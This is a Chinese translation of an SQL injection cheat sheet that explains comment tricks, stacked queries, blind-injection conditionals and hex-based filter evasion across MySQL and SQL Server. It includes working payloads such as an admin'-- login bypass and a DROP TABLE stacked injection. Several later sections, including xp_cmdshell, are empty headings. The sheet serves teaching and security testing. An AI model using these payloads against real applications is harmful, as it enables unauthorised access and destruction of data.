# SQL注入速查表

<small>*文档版本：1.4*</small>

## 关于SQL注入速查表
现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。

样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要

M:	MySQL
S: SQL Server
P:	PostgreSQL
O:	Oracle
+: (大概)其他所有数据库

*例子*：
+ (MS) 代表 : MySQL 和 SQL Server 等
+ (M*S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server

## 目录
1. 关于SQL注入速查表
1. 语法参考，攻击样例以及注入小技巧
	1. 行间注释(Line Comments)
		+ 使用了行间注释的SQL注入攻击样例
	1. 行内注释(Inline Comments)
		+ 使用了行内注释的注入攻击样例
		+ MySQL版本探测攻击样例
	1. 堆叠查询(Stacking Queries)
		+ 支持堆叠查询的语言/数据库
		+ 关于MySQL与PHP
		+ 堆叠注入攻击样例
	1. If语句
		+ MySQL的If语句
		+ SQL Server的If语句
		+ 使用了If语句的注入攻击样例
	1. 整数(Integers)的使用
	1. 字符串操作
		+ 字符串的串联
	1. 过滤单引号的字符串
		+ 使用了16进制的注入攻击样例
	1. 字符串异化(Modification)与联系
	1. Union注入
		+ UNION-语言问题处理
	1. 绕过登陆界面
	1. 在SQL Server 2005中启用xp_cmdshell
	1. 其他未整理的笔记

## 语法参考，攻击样例以及注入小技巧
### 行间注释
**注释掉查询语句的其余部分**
行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。

+ `--`(SM)

	```DROP sampletable;-- ```

+ `#`(M)

	```DROP sampletable;# ```
	
#### 使用了行间注释的SQL注入攻击样例
> 用户名:`admin'--`

+ 构成语句:`SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'`
这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。

### 行内注释
**通过不关闭注释注释掉查询语句的其余部分**，或者用于**绕过过滤**，移除空格，混淆，或探测数据库版本。

+ `/*注释内容*/`(SM)
	+ `DROP/*comment*/sampletable`
	+ `DR/**/OP/*绕过过滤*/sampletable`
	+ `SELECT/*替换空格*/password/**/FROM/**/Members`
+ `/*! MYSQL专属 */` (M) 

	这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。
	```SELECT /*!32302 1/0, */ 1 FROM tablename```

#### 使用了行内注释的注入攻击样例
> ID:`10; DROP TABLE members /*`

简单地摆脱了处理后续语句的麻烦，同样你可以使用`10; DROP TABLE members --`

#### MySQL版本探测攻击样例
> `SELECT /*!32302 1/0, */ 1 FROM tablename `

如果MySQL的版本高于**3.23.02**，会抛出一个`division by 0 error`

> ID:`/*!32302 10*/`

> ID:`10`

如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果

### 堆叠查询(Stacking Queries)
**一句代码之中执行多个查询语句**，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用

+ `;`(S)
	`SELECT * FROM members; DROP members--`
	结束一个查询并开始一个新的查询

#### 支持堆叠查询的语言/数据库
**绿色：**支持，**暗灰色：**不支持，**浅灰色：**未知
![支持堆叠查询的语言/数据库](http://ww2.sinaimg.cn/large/7d52f1ffgw1euwiy9impsj20dn03sgls.jpg)

#### 关于MySQL和PHP
阐明一些问题。

**PHP-MySQL不支持堆叠查询**，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？

*（译者注：MySQL 5.6.20版本下客户端支持堆叠查询）*

#### 堆叠注入攻击样例
> ID:`10;DROP members --`

构成语句：`SELECT * FROM products WHERE id = 10; DROP members--`

这在执行完正常查询之后将会执行DROP查询。

### If语句
根据If语句得到响应。这是**盲注(Blind SQL Injection)的关键之一**，同样也能简单而**准确地**进行一些测试。

#### MySQL的If语句
+ `IF(condition,true-part,false-part)`(M)

	> `SELECT IF (1=1,'true','false')`

#### SQL Server的If语句
+ `IF condition true-part ELSE false-part`(S)

	> `IF (1=1) SELECT 'true' ELSE SELECT 'false'`

#### 使用了If语句的注入攻击样例
> `if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0`(S)

如果当前用户不是**"sa"或者"dbo"**,就会抛出一个**`divide by zero error`**。

### 整数(Integers)的使用
对于绕过十分有用，比如**magic_quotes() 和其他类似过滤器**，甚至是各种WAF。

+ `0xHEXNUMBER`(SM)

	(HEXNUMBER:16进制数）
	你能这样使用16进制数：
	> `SELECT CHAR(0x66)`(S)

	> `SELECT 0x5045`(M) (这不是一个整数，而会是一个16进制字符串）
	
	> `SELECT 0x50 + 0x45`(M) (现在这是整数了)

### 字符串操作
#### 字符串的串联
### 过滤单引号的字符串
#### 使用了16进制的注入攻击样例
### 字符串异化(Modification)与联系
### Union注入
#### UNION-语言问题处理
### 绕过登陆界面
### 在SQL Server 2005中启用xp_cmdshell
### 其他未整理的笔记